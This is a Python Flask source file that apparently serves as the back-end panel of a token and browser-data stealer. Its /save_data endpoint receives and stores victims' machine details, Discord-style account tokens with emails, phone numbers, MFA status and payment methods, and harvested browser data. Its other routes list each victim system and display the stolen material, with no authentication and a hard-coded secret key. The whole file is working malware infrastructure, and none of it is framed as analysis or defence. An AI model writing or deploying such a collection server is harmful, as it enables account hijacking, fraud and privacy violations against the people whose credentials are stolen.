from flask import Flask, render_template, request, g, jsonify
import sqlite3
import os
import json
from threading import Lock
from datetime import datetime

app = Flask(__name__)
app.config['DATABASE'] = 'database/data.db'
app.config['SECRET_KEY'] = 'Boobs'
lock = Lock()

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(app.config['DATABASE'])
        g.db.row_factory = sqlite3.Row
        g.db.execute("PRAGMA foreign_keys = ON")
    return g.db

@app.teardown_appcontext
def close_db(error):
    db = g.pop('db', None)
    if db is not None:
        db.close()

def init_db():
    if not os.path.exists('database'):
        os.makedirs('database')
    db = sqlite3.connect(app.config['DATABASE'])
    with open('database/schema.sql', 'r') as f:
        db.executescript(f.read())
    db.commit()
    db.close()

# Routes
@app.route('/')
def index():
    db = get_db()
    try:
        systems = db.execute('''
            SELECT id, name, pc_name, os_info, 
                   strftime('%Y-%m-%d %H:%M:%S', timestamp) as timestamp 
            FROM systems ORDER BY timestamp DESC
        ''').fetchall()
        return render_template('index.html', systems=systems)
    except Exception as e:
        app.logger.error(f"Database error: {e}")
        return render_template('index.html', systems=[])

@app.route('/system/<int:system_id>')
def view_system(system_id):
    db = get_db()
    try:
        system = db.execute('''
            SELECT id, name, pc_name, os_info, 
                   strftime('%Y-%m-%d %H:%M:%S', timestamp) as timestamp 
            FROM systems WHERE id = ?
        ''', [system_id]).fetchone()
        
        if not system:
            return "System not found", 404        
        tokens = db.execute('''
            SELECT id, token, username, discriminator, user_id, email, phone,
                   mfa_enabled, nitro_type, payment_methods, avatar
            FROM tokens WHERE system_id = ?
        ''', [system_id]).fetchall()        
        raw_data = db.execute('''
            SELECT id, browser_name, data_type, content
            FROM browser_data WHERE system_id = ?
        ''', [system_id]).fetchall()

        browser_data = {}
        for item in raw_data:
            try:
                browser = item['browser_name']
                dtype = item['data_type']
                content = item['content']
                
                if browser not in browser_data:
                    browser_data[browser] = {}
                if dtype not in browser_data[browser]:
                    browser_data[browser][dtype] = []
                
                try:
                    parsed_content = json.loads(content) if content else None
                    browser_data[browser][dtype].append(parsed_content)
                except (json.JSONDecodeError, TypeError):
                    browser_data[browser][dtype].append(content)
            except KeyError as e:
                app.logger.warning(f"Missing key in browser data: {e}")
                continue

        return render_template('system.html',
                            system=dict(system),
                            tokens=[dict(t) for t in tokens],
                            browser_data=browser_data)
    
    except sqlite3.Error as e:
        app.logger.error(f"SQL Error loading system {system_id}: {str(e)}")
        return "Database error loading system data", 500
    except Exception as e:
        app.logger.error(f"Error loading system {system_id}: {str(e)}")
        return "Error loading system data", 500

@app.route('/save_data', methods=['POST'])
def save_data():
    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Request must be JSON'}), 400

    data = request.get_json()
    required_fields = ['system_name', 'pc_name', 'os_info']
    if not all(field in data for field in required_fields):
        return jsonify({'status': 'error', 'message': f'Missing required fields: {[field for field in required_fields if field not in data]}'}), 400

    try:
        with lock:
            db = get_db()
            cur = db.execute(
                'INSERT INTO systems (name, pc_name, os_info) VALUES (?, ?, ?)',
                (data['system_name'], data['pc_name'], data['os_info'])
            )
            system_id = cur.lastrowid

            tokens = data.get('tokens', [])
            if tokens:
                token_data = []
                for t in tokens:
                    token_data.append((
                        system_id,
                        t.get('token', ''),
                        t.get('username', ''),
                        t.get('discriminator', '0000'),
                        t.get('user_id', ''),
                        t.get('email'),
                        t.get('phone'),
                        bool(t.get('mfa_enabled', False)),
                        str(t.get('nitro_type', 'None')),
                        json.dumps(t.get('payment_methods', [])),
                        t.get('avatar')
                    ))
                
                db.executemany('''
                    INSERT INTO tokens 
                    (system_id, token, username, discriminator, user_id, email, phone, 
                     mfa_enabled, nitro_type, payment_methods, avatar)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', token_data)

            browser_data_all = data.get('browser_data', {})
            for browser_name, browser_info in browser_data_all.items():
                for data_type, items in browser_info.items():
                    if items:
                        browser_items = []
                        for item in items:
                            browser_items.append((
                                system_id,
                                browser_name,
                                data_type,
                                json.dumps(item) if isinstance(item, (dict, list)) else str(item)
                            ))
                        
                        db.executemany('''
                            INSERT INTO browser_data 
                            (system_id, browser_name, data_type, content)
                            VALUES (?, ?, ?, ?)
                        ''', browser_items)

            db.commit()
            return jsonify({'status': 'success', 'system_id': system_id})

    except sqlite3.Error as e:
        db.rollback()
        app.logger.error(f"Database error: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Database operation failed'}), 500
    except Exception as e:
        db.rollback()
        app.logger.error(f"Unexpected error: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

if __name__ == '__main__':
    if not os.path.exists(app.config['DATABASE']):
        init_db()
    app.run(host='0.0.0.0', port=3000, threaded=True)